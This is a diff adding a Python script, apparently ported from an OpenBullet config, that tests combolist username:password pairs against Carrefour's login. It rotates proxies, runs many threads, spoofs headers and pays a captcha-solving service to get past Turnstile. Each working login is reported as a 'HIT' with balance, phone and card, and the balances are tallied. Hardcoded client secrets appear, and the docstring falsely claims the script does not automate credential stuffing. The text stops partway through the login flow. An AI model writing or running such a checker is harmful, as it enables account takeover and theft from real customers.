@@ -1,0 +1,1332 @@
+#!/usr/bin/env python3
+"""
+Python port of the OpenBullet / Node flow for Carrefour IAM (PKCE, forwarder,
+ForgeRock authenticate, captcha solver, login JSON, OAuth code, tokens, API).
+
+En mode interactif : threads, puis deux phases comme dans la config OB :
+  USEPROXY FALSE — forwarder local + en-tête postProxy (fichier ou URL).
+  USEPROXY TRUE  — HTTPS direct vers moncompte.fr / apimx : fichier proxies
+      urllib séparé, ou réutiliser le même postProxy, ou sans proxy urllib.
+  Solver et createTask/getTaskResult : toujours sans proxy urllib (réseau sortant direct).
+  Chaque étape du flux est journalisée sur stdout (préfixe par ligne combolist).
+  En combolist, une ligne `[EN DIRECT] …` sur stderr est rafraîchie (compteurs + somme soldes).
+
+Variables d’environnement (alternative ou complément) :
+  SOLVER_CLIENT_KEY    — clé API solverify (sinon demandée au lancement si vide)
+  POST_PROXY_URL       — proxy pour le forwarder (USEPROXY FALSE / postProxy)
+  DIRECT_HTTPS_PROXY   — USEPROXY TRUE : proxy urllib pour moncompte.fr / apimx
+      (authorize, access_token, API). Vide ou « none » / « false » = pas de proxy.
+      Si la variable n’existe pas : réutilise POST_PROXY_URL par défaut.
+  CARREFOUR_USER / CARREFOUR_PASS — un seul compte sans combolist
+  THREAD_COUNT         — nombre de workers en mode combolist (défaut 1)
+  LOCAL_FORWARDER_URL  — default http://127.0.0.1:5000
+  OAUTH_AUTHORIZATION_BASIC — Base64 for Android token exchange
+  CARREFOUR_API_CLIENT_ID / CARREFOUR_API_CLIENT_SECRET — apimx headers
+
+  HTTPS_PROXY / HTTP_PROXY — non utilisés (préférez DIRECT_HTTPS_PROXY)
+
+This file intentionally does not automate credential stuffing or bypass;
+it is a faithful structural translation of the supplied blocks for integration
+testing or migration off OpenBullet.
+"""
+
+from __future__ import annotations
+
+import base64
+import gzip
+import hashlib
+import json
+import math
+import os
+import random
+import re
+import secrets
+import sys
+import threading
+import time
+import uuid
+import urllib.error
+import urllib.parse
+import urllib.request
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from dataclasses import dataclass
+from datetime import datetime, timezone
+from typing import Any, Callable
+
+# --- Configuration ---
+
+LOCAL_FORWARDER = os.environ.get("LOCAL_FORWARDER_URL", "http://127.0.0.1:5000")
+SOLVER_CLIENT_KEY = os.environ.get("SOLVER_CLIENT_KEY", "")
+
+OAUTH_AUTHORIZATION_BASIC = os.environ.get(
+    "OAUTH_AUTHORIZATION_BASIC",
+    "Y2FycmVmb3VyX29uZWNhcnJlZm91cl9hbmRyb2lkOmU0N1pleDdXTg==",
+)
+
+CARREFOUR_API_CLIENT_ID = os.environ.get(
+    "CARREFOUR_API_CLIENT_ID",
+    "iHfpiidFSFr0iIcnyO5wRLPUSoVprtijxdS3AhRAk0vQOWqf",
+)
+CARREFOUR_API_CLIENT_SECRET = os.environ.get(
+    "CARREFOUR_API_CLIENT_SECRET",
+    "IfTK4HJCQEvic4z3fXSLzGti66Ex7R1DeBrfRtt2tr9horVRq33IB2Xsfch1pGec",
+)
+
+CODE_VERIFIER_ALPHABET = (
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~"
+)
+
+AUTHENTICATE_POST_URL = (
+    "https://moncompte.carrefour.fr/iam/json/authenticate?"
+    "realm=/CarrefourConnect&goto=http%3A%2F%2Fmoncompte.carrefour.fr%2Fiam%2Foauth2%2F"
+    "CarrefourConnect%2Fauthorize%3Fclient_id%3Dcarrefour_onecarrefour_web%26"
+    "redirect_uri%3Dhttps%253A%252F%252Fwww.carrefour.fr%252Flogin%252Fcheck%26"
+    "response_type%3Dcode%26scope%3Dopenid%2520iam%2520register-"
+    "aHR0cHM6Ly93d3cuY2FycmVmb3VyLmZyL21vbi1jb21wdGUvaW5zY3JpcHRpb24%253D"
+    "&realm=/CarrefourConnect"
+)
+
+ANDROID_CLIENT_ID = "carrefour_onecarrefour_android"
+REDIRECT_URI_APP = "fr.carrefourconnect://redirect_uri"
+
+
+@dataclass(frozen=True)
+class ProxyRouting:
+    """
+    Mirrors OpenBullet USEPROXY FALSE vs TRUE:
+    - forwarder_proxies → postProxy on LOCAL_FORWARDER (USEPROXY FALSE).
+    - direct_https_proxy_for_job() → urllib proxy for real HTTPS URLs (USEPROXY TRUE).
+    """
+
+    forwarder_proxies: list[str]
+    direct_same_as_forwarder: bool
+    direct_proxies: list[str]
+
+    def direct_https_proxy_for_job(self, line_index: int, post_proxy: str) -> str | None:
+        if self.direct_same_as_forwarder:
+            return None
+        if not self.direct_proxies:
+            return ""
+        return self.direct_proxies[line_index % len(self.direct_proxies)].strip() or None
+
+
+def _maybe_decompress(headers: dict[str, str], body: bytes) -> bytes:
+    enc = headers.get("content-encoding", "").lower()
+    if "gzip" in enc and body:
+        try:
+            return gzip.decompress(body)
+        except OSError:
+            return body
+    return body
+
+
+def generate_code_verifier(length: int = 128) -> str:
+    return "".join(
+        secrets.choice(CODE_VERIFIER_ALPHABET) for _ in range(length)
+    )
+
+
+def base64_url_encode(raw: bytes) -> str:
+    return (
+        base64.b64encode(raw)
+        .decode("ascii")
+        .replace("+", "-")
+        .replace("/", "_")
+        .rstrip("=")
+    )
+
+
+def generate_code_challenge(code_verifier: str) -> str:
+    digest = hashlib.sha256(code_verifier.encode("utf-8")).digest()
+    return base64_url_encode(digest)
+
+
+_SOLVER_OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+
+
+def _build_direct_https_opener(proxy_url: str | None) -> urllib.request.OpenerDirector:
+    """USEPROXY TRUE: real HTTPS to Carrefour; optional urllib HTTP(S) proxy."""
+    if not proxy_url or not proxy_url.strip():
+        return urllib.request.build_opener(urllib.request.ProxyHandler({}))
+    pu = proxy_url.strip()
+    proxies = {"http": pu, "https": pu}
+    return urllib.request.build_opener(urllib.request.ProxyHandler(proxies))
+
+
+def _http_request(
+    opener: urllib.request.OpenerDirector,
+    url: str,
+    method: str = "GET",
+    headers: dict[str, str] | None = None,
+    data: bytes | None = None,
+    timeout: float = 120.0,
+) -> tuple[int, dict[str, str], bytes]:
+    req = urllib.request.Request(url, data=data, method=method.upper())
+    for k, v in (headers or {}).items():
+        req.add_header(k, v)
+    try:
+        with opener.open(req, timeout=timeout) as resp:
+            status = resp.getcode() or 0
+            hdrs = {k.lower(): v for k, v in resp.headers.items()}
+            body = resp.read()
+            body = _maybe_decompress(hdrs, body)
+            return status, hdrs, body
+    except urllib.error.HTTPError as e:
+        hdrs = {k.lower(): v for k, v in e.headers.items()} if e.headers else {}
+        body = e.read() if e.fp else b""
+        body = _maybe_decompress(hdrs, body)
+        return e.code, hdrs, body
+
+
+_FORWARDER_OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+
+
+def forwarder_get(
+    post_url: str,
+    extra_headers: dict[str, str],
+    post_proxy: str,
+    *,
+    post_url_header: str = "postUrl",
+) -> tuple[int, dict[str, str], bytes]:
+    h = {
+        "User-Agent": (
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+            "(KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
+        ),
+        "Pragma": "no-cache",
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.8",
+        post_url_header: post_url,
+        "postProxy": post_proxy.rstrip("\n"),
+        **extra_headers,
+    }
+    return _http_request(_FORWARDER_OPENER, LOCAL_FORWARDER, method="GET", headers=h, data=b"")
+
+
+def forwarder_post(
+    post_url: str,
+    extra_headers: dict[str, str],
+    post_proxy: str,
+    body: bytes = b"",
+    *,
+    post_url_header: str = "posturl",
+) -> tuple[int, dict[str, str], bytes]:
+    h = {
+        post_url_header: post_url,
+        "postProxy": post_proxy.rstrip("\n"),
+        **extra_headers,
+    }
+    return _http_request(_FORWARDER_OPENER, LOCAL_FORWARDER, method="POST", headers=h, data=body)
+
+
+def header_location(headers: dict[str, str]) -> str | None:
+    return headers.get("location")
+
+
+def parse_lr(text: str, left: str, right: str) -> str | None:
+    try:
+        start = text.index(left) + len(left)
+        end = text.index(right, start)
+        return text[start:end]
+    except ValueError:
+        return None
+
+
+def parse_json_token(text: str, key: str) -> Any:
+    try:
+        obj = json.loads(text)
+    except json.JSONDecodeError:
+        return None
+    if isinstance(obj, dict) and key in obj:
+        return obj[key]
+    return None
+
+
+def solver_create_task(client_key: str) -> dict[str, Any]:
+    payload = {
+        "clientKey": client_key,
+        "task": {
+            "type": "turnstile",
+            "websiteURL": (
+                "https://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/authorize"
+            ),
+            "websiteKey": "0x4AAAAAAADaNvwE6lw9Qsdq",
+            "cdata": "",
+            "action": "LOGIN",
+        },
+    }
+    body = json.dumps(payload, separators=(",", ":")).encode("utf-8")
+    status, _, raw = _http_request(
+        _SOLVER_OPENER,
+        "https://solver.solverify.net/createTask",
+        method="POST",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        data=body,
+    )
+    if status != 200:
+        raise RuntimeError(f"createTask HTTP {status}: {raw[:500]!r}")
+    return json.loads(raw.decode("utf-8", errors="replace"))
+
+
+def _mask_proxy_url(url: str) -> str:
+    """Affichage court du proxy (sans mot de passe en clair si possible)."""
+    u = url.strip()
+    if not u:
+        return "(vide)"
+    try:
+        p = urllib.parse.urlparse(u)
+        host = p.hostname or ""
+        port = f":{p.port}" if p.port else ""
+        user = p.username or ""
+        if user:
+            return f"{user}:***@{host}{port}"
+        return f"{host}{port}" or u[:48]
+    except Exception:
+        return u[:48] + ("…" if len(u) > 48 else "")
+
+
+def _flow_log(job_prefix: str, step: str, detail: str = "") -> None:
+    line = f"{job_prefix} | {step}"
+    if detail:
+        line += f" | {detail}"
+    print(line, flush=True)
+
+
+def solver_get_result(client_key: str, task_id: str) -> dict[str, Any]:
+    payload = {"clientKey": client_key, "taskId": task_id}
+    body = json.dumps(payload).encode("utf-8")
+    status, _, raw = _http_request(
+        _SOLVER_OPENER,
+        "https://solver.solverify.net/getTaskResult",
+        method="POST",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        data=body,
+    )
+    if status != 200:
+        raise RuntimeError(f"getTaskResult HTTP {status}: {raw[:500]!r}")
+    return json.loads(raw.decode("utf-8", errors="replace"))
+
+
+def _response_is_solver_processing(result: dict[str, Any]) -> bool:
+    """True if the API still indicates a pending task (repeat getTaskResult)."""
+    status = result.get("status")
+    if isinstance(status, str) and status.lower() == "processing":
+        return True
+    blob = json.dumps(result, ensure_ascii=False).lower()
+    return "processing" in blob
+
+
+def _extract_turnstile_token_from_solver_result(result: dict[str, Any]) -> str | None:
+    if result.get("status") != "ready":
+        return None
+    tok = result.get("value")
+    if tok:
+        return str(tok)
+    sol = result.get("solution")
+    if isinstance(sol, dict):
+        t = sol.get("token") or sol.get("value")
+        if t:
+            return str(t)
+    return None
+
+
+def poll_solver_until_turnstile_token(
+    client_key: str,
+    task_id: str,
+    *,
+    poll_interval: float = 2.0,
+    max_seconds: float = 600.0,
+    on_poll: Callable[[int, dict[str, Any]], None] | None = None,
+) -> str:
+    """
+    Call getTaskResult in a loop: while the body/status is still « processing »,
+    send the same request again until the Turnstile token is available.
+    """
+    deadline = time.monotonic() + max_seconds
+    attempt = 0
+    while time.monotonic() < deadline:
+        attempt += 1
+        result = solver_get_result(client_key, str(task_id))
+        if callable(on_poll):
+            try:
+                on_poll(attempt, result)
+            except Exception:
+                pass
+        err = result.get("errorId")
+        if err not in (None, 0, "0"):
+            raise RuntimeError(f"Solver getTaskResult errorId: {result}")
+
+        token = _extract_turnstile_token_from_solver_result(result)
+        if token:
+            return token
+
+        if _response_is_solver_processing(result):
+            time.sleep(poll_interval)
+            continue
+
+        time.sleep(poll_interval)
+
+    raise RuntimeError(
+        "Captcha solver: délai dépassé (getTaskResult toujours sans jeton / processing)."
+    )
+
+
+def _reverse_hex_triplet(s: str) -> str:
+    return s[::-1]
+
+
+def _get_java_week_of_month(year: int, month_0_11: int, day: int) -> int:
+    """Match JS: new Date(Date.UTC(year, month, 1))."""
+    first = datetime(year, month_0_11 + 1, 1, tzinfo=timezone.utc)
+    first_dow_js = (first.weekday() + 1) % 7  # JS: Sun=0
+    first_dow_mon = (first_dow_js + 6) % 7
+    days_in_first_week = 7 - first_dow_mon
+    week1 = days_in_first_week >= 4
+    if day <= days_in_first_week:
+        return 1 if week1 else 0
+    return (1 if week1 else 0) + math.ceil((day - days_in_first_week) / 7)
+
+
+def _shuffle(lst: list[Any]) -> None:
+    for i in range(len(lst) - 1, 0, -1):
+        j = random.randint(0, i)
+        lst[i], lst[j] = lst[j], lst[i]
+
+
+def generate_carrefour_request_ids(
+    x_session_id: str | None = None,
+) -> tuple[str, str, str]:
+    """
+    Port of the Node block: xSessionId (UUID), xRequestId (hex string),
+    xCorrelationId (8 hex from XOR + tail of random UUID).
+    """
+    if x_session_id:
+        sid = x_session_id
+    else:
+        sid = str(uuid.uuid4())
+
+    now = datetime.now(timezone.utc)
+    utc_month = now.month - 1  # 0..11 like JS getUTCMonth
+    utc_date = now.day
+    utc_day_js = (now.weekday() + 1) % 7  # align with JS getUTCDay (Sun=0)
+    utc_year = now.year
+    java_day_of_week = 1 if utc_day_js == 0 else utc_day_js + 1
+    week_of_month = _get_java_week_of_month(utc_year, utc_month, utc_date)
+
+    month_value = (utc_month + 1) * 0x13C
+    week_value = (week_of_month + 1) * 0x2A6
+    day_value = ((java_day_of_week + 5) % 7 + 1) * 0x23C
+
+    month_hex = f"{month_value:03x}"
+    week_hex = f"{week_value:03x}"
+    day_hex = f"{day_value:03x}"
+
+    if random.random() < 0.5:
+        month_hex = _reverse_hex_triplet(month_hex)
+    if random.random() < 0.5:
+        week_hex = _reverse_hex_triplet(week_hex)
+    if random.random() < 0.5:
+        day_hex = _reverse_hex_triplet(day_hex)
+
+    u1 = str(uuid.uuid4()).replace("-", "")
+    u2 = str(uuid.uuid4()).replace("-", "")
+    combined = (u1 + u2).lower()
+
+    length = len(combined)
+    r1 = random.randint(0, max(0, length - 9))
+    pos_a = random.randint(0, r1)
+    pos_b = r1 + 3
+    remaining = length - r1 - 8
+    pos_c = random.randint(0, max(0, remaining - 1)) + r1 + 6
+
+    positions = [pos_a, pos_b, pos_c]
+    segments = [month_hex, week_hex, day_hex]
+    _shuffle(positions)
+
+    for i in range(3):
+        p = positions[i]
+        seg = segments[i]
+        combined = combined[:p] + seg + combined[p + 3 :]
+
+    x_request_id = combined.upper()
+
+    xor_magic = 0x6B9E257C
+    try:
+        prefix = x_request_id[:8]
+        parsed = int(prefix, 16)
+        xored = (parsed ^ xor_magic) & 0xFFFFFFFF
+        xored_hex = f"{xored:08x}"
+        uuid_full = str(uuid.uuid4())
+        uuid_tail = uuid_full[8:]
+        x_correlation_id = (xored_hex + uuid_tail).upper()
+    except (ValueError, IndexError):
+        x_correlation_id = ""
+
+    return sid, x_request_id, x_correlation_id
+
+
+def classify_authenticate_response(source: str) -> str:
+    """Map Keycheck blocks to a single label."""
+    if "successUrl" in source:
+        return "success"
+    if "Domaine non valide" in source:
+        return "retry"
+    fails = (
+        "Votre adresse ou mot de passe ne sont pas valides",
+        "Compte suspendu",
+        "was expecting comma to separate Object entries",
+        "Changement de mot de passe",
+        "Unrecognized character escape ",
+    )
+    if any(f in source for f in fails):
+        return "fail"
+    if "Aidez-nous à confirmer votre identité" in source:
+        return "custom"
+    return "unknown"
+
+
+def build_login_json_body(
+    auth_id: str,
+    user: str,
+    password: str,
+    captcha_token: str,
+) -> bytes:
+    payload = {
+        "authId": auth_id,
+        "template": "",
+        "stage": "CarrefourIAMLDAP1",
+        "header": "Content de vous (re)voir !",
+        "callbacks": [
+            {
+                "type": "NameCallback",
+                "output": [{"name": "prompt", "value": "Adresse électronique"}],
+                "input": [{"name": "IDToken1", "value": user}],
+            },
+            {
+                "type": "PasswordCallback",
+                "output": [{"name": "prompt", "value": "Mot de passe"}],
+                "input": [{"name": "IDToken2", "value": password}],
+            },
+            {
+                "type": "CaptchaCallback",
+                "output": [
+                    {"name": "version", "value": "V2(Invisible)"},
+                    {"name": "prompt", "value": "0x4AAAAAAADaNvwE6lw9Qsdq"},
+                ],
+                "input": [{"name": "IDToken3", "value": captcha_token}],
+            },
+        ],
+    }
+    return json.dumps(payload, ensure_ascii=False).encode("utf-8")
+
+
+def parse_regex_one(text: str, pattern: str) -> str | None:
+    m = re.search(pattern, text)
+    return m.group(1) if m else None
+
+
+def _prompt_yes_o_no(message: str) -> bool:
+    while True:
+        raw = input(message).strip().upper()
+        if raw in ("O", "OUI", "Y", "YES"):
+            return True
+        if raw in ("N", "NON", "NO"):
+            return False
+        print("Réponse attendue : O ou N.")
+
+
+def _load_proxy_lines(path: str) -> list[str]:
+    p = os.path.expanduser(path.strip())
+    if not os.path.isfile(p):
+        raise FileNotFoundError(f"Fichier proxies introuvable : {p}")
+    out: list[str] = []
+    with open(p, encoding="utf-8", errors="replace") as f:
+        for line in f:
+            line = line.strip()
+            if not line or line.startswith("#"):
+                continue
+            if not line.lower().startswith("http"):
+                raise ValueError(
+                    f"Ligne proxy invalide (attendu http://...) : {line[:80]!r}"
+                )
+            out.append(line)
+    if not out:
+        raise ValueError("Le fichier proxies ne contient aucune ligne utilisable.")
+    return out
+
+
+def _parse_combo_line(line: str) -> tuple[str, str] | None:
+    line = line.strip()
+    if not line or line.startswith("#"):
+        return None
+    sep = ":" if ":" in line else None
+    if sep is None and ";" in line:
+        user, _, pw = line.partition(";")
+        user, pw = user.strip(), pw.strip()
+        if user and pw:
+            return user, pw
+        return None
+    if ":" in line:
+        user, _, rest = line.partition(":")
+        user, rest = user.strip(), rest.strip()
+        if user and rest:
+            return user, rest
+    return None
+
+
+def _load_combo_lines(path: str) -> list[tuple[str, str]]:
+    p = os.path.expanduser(path.strip())
+    if not os.path.isfile(p):
+        raise FileNotFoundError(f"Combolist introuvable : {p}")
+    pairs: list[tuple[str, str]] = []
+    with open(p, encoding="utf-8", errors="replace") as f:
+        for line in f:
+            parsed = _parse_combo_line(line)
+            if parsed:
+                pairs.append(parsed)
+    if not pairs:
+        raise ValueError("La combolist ne contient aucune paire user:password utilisable.")
+    return pairs
+
+
+def _interactive_proxy_routing_and_combolist() -> tuple[ProxyRouting, list[tuple[str, str]]]:
+    """
+    USEPROXY FALSE : forwarder + postProxy (fichier ou URL unique).
+    USEPROXY TRUE  : HTTPS direct — fichier proxies distinct, ou même postProxy, ou sans proxy.
+    """
+    print("--- USEPROXY FALSE : forwarder (postProxy) ---")
+    use_file = _prompt_yes_o_no("Utiliser un fichier de proxies (postProxy) ? [O/N] : ")
+    forwarder_proxies: list[str] = []
+    if use_file:
+        fpath = input(
+            "Chemin du fichier (une URL par ligne, ex. http://user:pass@host:823) : "
+        ).strip()
+        forwarder_proxies = _load_proxy_lines(fpath)
+        print(f"  {len(forwarder_proxies)} proxy(s) forwarder chargé(s).")
+    else:
+        env_one = os.environ.get("POST_PROXY_URL", "").strip()
+        if env_one:
+            forwarder_proxies = [env_one]
+            print("  Un seul postProxy : variable POST_PROXY_URL.")
+        else:
+            one = input(
+                "URL postProxy pour le forwarder, ex. http://user:pass@host:823 : "
+            ).strip()
+            if not one:
+                raise RuntimeError(
+                    "Sans fichier, indiquez une URL postProxy ou définissez POST_PROXY_URL."
+                )
+            if not one.lower().startswith("http"):
+                raise ValueError("L'URL doit commencer par http:// ou https://")
+            forwarder_proxies = [one]
+
+    print("--- USEPROXY TRUE : HTTPS direct (moncompte.fr, apimx) ---")
+    use_direct_file = _prompt_yes_o_no(
+        "Fichier de proxies distinct pour urllib (HTTPS direct) ? [O/N] : "
+    )
+    direct_same = False
+    direct_proxies: list[str] = []
+    if use_direct_file:
+        dpath = input(
+            "Chemin du fichier (même format, une URL http(s)://... par ligne) : "
+        ).strip()
+        direct_proxies = _load_proxy_lines(dpath)
+        print(f"  {len(direct_proxies)} proxy(s) HTTPS chargé(s).")
+    else:
+        reuse = _prompt_yes_o_no(
+            "Réutiliser le même postProxy pour les HTTPS directs (urllib) ? "
+            "[O=oui / N=non, connexion directe sans proxy urllib] : "
+        )
+        direct_same = reuse
+
+    print("--- Combolist ---")
+    cpath = input(
+        "Chemin du fichier combolist (user:password ou user;password par ligne) : "
+    ).strip()
+    combos = _load_combo_lines(cpath)
+    print(f"  {len(combos)} ligne(s) dans la combolist.")
+
+    routing = ProxyRouting(
+        forwarder_proxies=forwarder_proxies,
+        direct_same_as_forwarder=direct_same,
+        direct_proxies=direct_proxies,
+    )
+    return routing, combos
+
+
+def _resolve_env_direct_https_proxy() -> str | None:
+    """
+    None  → même URL que postProxy sur les HTTPS directs (défaut type config OB).
+    ''    → pas de proxy urllib (USEPROXY TRUE sans proxy).
+    URL   → proxy urllib dédié.
+    """
+    if "DIRECT_HTTPS_PROXY" not in os.environ:
+        return None
+    v = os.environ.get("DIRECT_HTTPS_PROXY", "").strip()
+    if v.lower() in ("", "none", "false", "0", "off"):
+        return ""
+    if not v.lower().startswith("http"):
+        raise ValueError("DIRECT_HTTPS_PROXY doit être une URL http:// ou https://")
+    return v
+
+
+def _solver_key_interactive() -> str:
+    k = SOLVER_CLIENT_KEY.strip()
+    if k:
+        return k
+    k = input("Clé client solverify (SOLVER_CLIENT_KEY) : ").strip()
+    if not k:
+        raise RuntimeError("SOLVER_CLIENT_KEY requis.")
+    return k
+
+
+def _prompt_thread_count() -> int:
+    while True:
+        raw = input("Nombre de threads (workers) : ").strip()
+        if not raw:
+            return 1
+        try:
+            n = int(raw)
+        except ValueError:
+            print("Entrez un entier >= 1.")
+            continue
+        if n < 1:
+            print("Minimum 1 thread.")
+            continue
+        if n > 512:
+            print("Maximum 512 (sécurité).")
+            continue
+        return n
+
+
+class RunStats:
+    """Compteurs thread-safe pour le mode combolist."""
+
+    __slots__ = ("_lock", "success", "invalid", "errors", "total_solde_hits")
+
+    def __init__(self) -> None:
+        self._lock = threading.Lock()
+        self.success = 0
+        self.invalid = 0
+        self.errors = 0
+        self.total_solde_hits = 0.0
+
+    def add_success(self, solde: Any) -> None:
+        with self._lock:
+            self.success += 1
+            if solde is None:
+                return
+            try:
+                self.total_solde_hits += float(solde)
+            except (TypeError, ValueError):
+                pass
+
+    def add_invalid(self) -> None:
+        with self._lock:
+            self.invalid += 1
+
+    def add_error(self) -> None:
+        with self._lock:
+            self.errors += 1
+
+    def snapshot(self) -> tuple[int, int, int, float]:
+        with self._lock:
+            return (
+                self.success,
+                self.invalid,
+                self.errors,
+                self.total_solde_hits,
+            )
+
+
+class LiveCounterDisplay:
+    """Une ligne sur stderr mise à jour en direct (compteurs agrégés)."""
+
+    def __init__(self, stats: RunStats, total_jobs: int) -> None:
+        self._stats = stats
+        self._total = max(1, total_jobs)
+        self._stop = threading.Event()
+        self._thread: threading.Thread | None = None
+
+    def _loop(self) -> None:
+        while not self._stop.wait(0.25):
+            s, inv, err, total_solde = self._stats.snapshot()
+            done = s + inv + err
+            msg = (
+                f"\r[EN DIRECT] traités {done}/{self._total} | "
+                f"SUCCESS={s} INVALID={inv} ERR={err} | "
+                f"somme_soldes={total_solde:.2f}   "
+            )
+            print(msg, end="", file=sys.stderr, flush=True)
+
+    def start(self) -> None:
+        self._thread = threading.Thread(target=self._loop, daemon=True)
+        self._thread.start()
+
+    def stop(self) -> None:
+        self._stop.set()
+        if self._thread is not None:
+            self._thread.join(timeout=2.0)
+        print(file=sys.stderr, flush=True)
+
+
+def _run_one_combo_job(
+    line_no: int,
+    user: str,
+    password: str,
+    post_proxy: str,
+    routing: ProxyRouting,
+    solver_client_key: str,
+    stats: RunStats,
+) -> None:
+    job_prefix = f"[ligne {line_no}]"
+    label = f"[{line_no}] {user}"
+    direct_https = routing.direct_https_proxy_for_job(line_no - 1, post_proxy)
+    try:
+        out = run_full_flow(
+            post_proxy,
+            user,
+            password,
+            solver_client_key=solver_client_key,
+            direct_https_proxy=direct_https,
+            job_prefix=job_prefix,
+            verbose_steps=True,
+        )
+    except Exception as e:
+        stats.add_error()
+        print(f"{label} | ERROR | {e}", flush=True)
+        return
+
+    outcome = out.get("authenticate_outcome")
+    if outcome == "success":
+        stats.add_success(out.get("solde"))
+        solde = out.get("solde")
+        phone = out.get("phone") or ""
+        carte = out.get("carte") or ""
+        solde_s = f"{solde}" if solde is not None else "N/A"
+        print(
+            f"HIT | {label} | solde={solde_s} | phone={phone} | carte={carte}",
+            flush=True,
+        )
+    else:
+        stats.add_invalid()
+        print(f"{label} | INVALID | outcome={outcome}", flush=True)
+
+
+def _run_combo_pool(
+    routing: ProxyRouting,
+    combos: list[tuple[str, str]],
+    solver_client_key: str,
+    num_threads: int,
+) -> None:
+    stats = RunStats()
+    live = LiveCounterDisplay(stats, len(combos))
+    live.start()
+    n_proxy = len(routing.forwarder_proxies)
+    jobs: list[tuple[int, str, str, str]] = []
+    for i, (user, password) in enumerate(combos):
+        post_proxy = routing.forwarder_proxies[i % n_proxy]
+        jobs.append((i + 1, user, password, post_proxy))
+
+    try:
+        with ThreadPoolExecutor(max_workers=num_threads) as ex:
+            futs = [
+                ex.submit(
+                    _run_one_combo_job,
+                    line_no,
+                    user,
+                    password,
+                    post_proxy,
+                    routing,
+                    solver_client_key,
+                    stats,
+                )
+                for line_no, user, password, post_proxy in jobs
+            ]
+            for fut in as_completed(futs):
+                fut.result()
+    finally:
+        live.stop()
+
+    s, inv, err, total_solde = stats.snapshot()
+    total_lines = len(combos)
+    print("\n========== RÉSUMÉ ==========", flush=True)
+    print(f"Total lignes   : {total_lines}", flush=True)
+    print(f"SUCCESS (hits) : {s}", flush=True)
+    print(f"INVALID        : {inv}", flush=True)
+    print(f"ERREURS        : {err}", flush=True)
+    print(f"Somme soldes   : {total_solde}", flush=True)
+    print("==============================", flush=True)
+
+
+def run_full_flow(
+    post_proxy: str,
+    user: str,
+    password: str,
+    *,
+    solver_client_key: str,
+    direct_https_proxy: str | None = None,
+    job_prefix: str = "",
+    verbose_steps: bool = True,
+) -> dict[str, Any]:
+    """
+    direct_https_proxy:
+      None  → même URL que post_proxy pour urllib (équivalent config OB : même postProxy).
+      ""    → pas de proxy urllib sur les HTTPS directs.
+      URL   → proxy urllib dédié pour moncompte.fr / apimx.
+
+    job_prefix / verbose_steps : logs détaillés par étape sur stdout (mode combolist).
+    """
+    if not post_proxy.strip():
+        raise RuntimeError("post_proxy (postProxy pour le forwarder) est vide.")
+    if not solver_client_key.strip():
+        raise RuntimeError("solver_client_key est vide.")
+    if not user or not password:
+        raise RuntimeError("Identifiants user/password vides.")
+
+    jp = job_prefix.strip() or "[flow]"
+
+    def log(step: str, detail: str = "") -> None:
+        if verbose_steps:
+            _flow_log(jp, step, detail)
+
+    # USEPROXY TRUE : HTTPS réel (pas le forwarder). Proxy urllib optionnel.
+    if direct_https_proxy is None:
+        direct_opener = _build_direct_https_opener(post_proxy.strip())
+        log(
+            "USEPROXY TRUE (urllib)",
+            f"même proxy que postProxy → {_mask_proxy_url(post_proxy)}",
+        )
+    else:
+        direct_opener = _build_direct_https_opener(
+            direct_https_proxy.strip() or None
+        )
+        if direct_https_proxy.strip():
+            log(
+                "USEPROXY TRUE (urllib)",
+                f"proxy dédié → {_mask_proxy_url(direct_https_proxy)}",
+            )
+        else:
+            log("USEPROXY TRUE (urllib)", "sans proxy (connexion directe)")
+
+    log("USEPROXY FALSE (forwarder)", f"{LOCAL_FORWARDER} postProxy={_mask_proxy_url(post_proxy)}")
+
+    code_verifier = generate_code_verifier()
+    code_challenge = generate_code_challenge(code_verifier)
+    log("PKCE", f"code_challenge={code_challenge[:24]}… (verifier len={len(code_verifier)})")
+
+    authorize_qs = urllib.parse.urlencode(
+        {
+            "response_type": "code",
+            "client_id": "carrefour_onecarrefour_ios",
+            "scope": "openid iam",
+            "redirect_uri": REDIRECT_URI_APP,
+            "code_challenge": code_challenge,
+            "code_challenge_method": "S256",
+        },
+        safe="",
+    )
+    post_url_1 = (
+        "https://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/authorize?"
+        + authorize_qs.replace("+", "%20")
+    )
+
+    def _short(s: str | None, n: int = 120) -> str:
+        if not s:
+            return "(vide)"
+        return s if len(s) <= n else s[:n] + "…"
+
+    log("Étape 1", "forwarder GET → authorize iOS (postUrl)")
+    st1, h1, _ = forwarder_get(post_url_1, {}, post_proxy)
+    location1 = header_location(h1)
+    log("Étape 1 réponse", f"HTTP {st1} Location={_short(location1)}")
+    if not location1:
+        raise RuntimeError("Step 1: missing Location header")
+
+    log("Étape 2", "forwarder GET → Location1 (suivi redirect)")
+    st2, h2, _ = forwarder_get(
+        location1,
+        {
+            "Connection": "close",
+            "Host": "moncompte.carrefour.fr",
+            "Referer": "https://www.carrefour.fr/",
+            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
+            "sec-ch-ua-mobile": "?0",
+            'sec-ch-ua-platform': '"Windows"',
+            "Sec-Fetch-Dest": "document",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": "same-site",
+            "Sec-Fetch-User": "?1",
+            "Upgrade-Insecure-Requests": "1",
+        },
+        post_proxy,
+    )
+    loc2 = header_location(h2)
+    log("Étape 2 réponse", f"HTTP {st2} Location={_short(loc2)}")
+    if not loc2:
+        raise RuntimeError("Step 2: missing Location header")
+
+    step3_target = (
+        loc2 if loc2.startswith("http") else "https://moncompte.carrefour.fr" + loc2
+    )
+    log("Étape 3", f"forwarder GET → {_short(step3_target, 100)}")
+    st3, _, _ = forwarder_get(
+        step3_target,
+        {
+            "User-Agent": (
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+                "(KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
+            ),
+            "Pragma": "no-cache",
+            "Accept": "*/*",
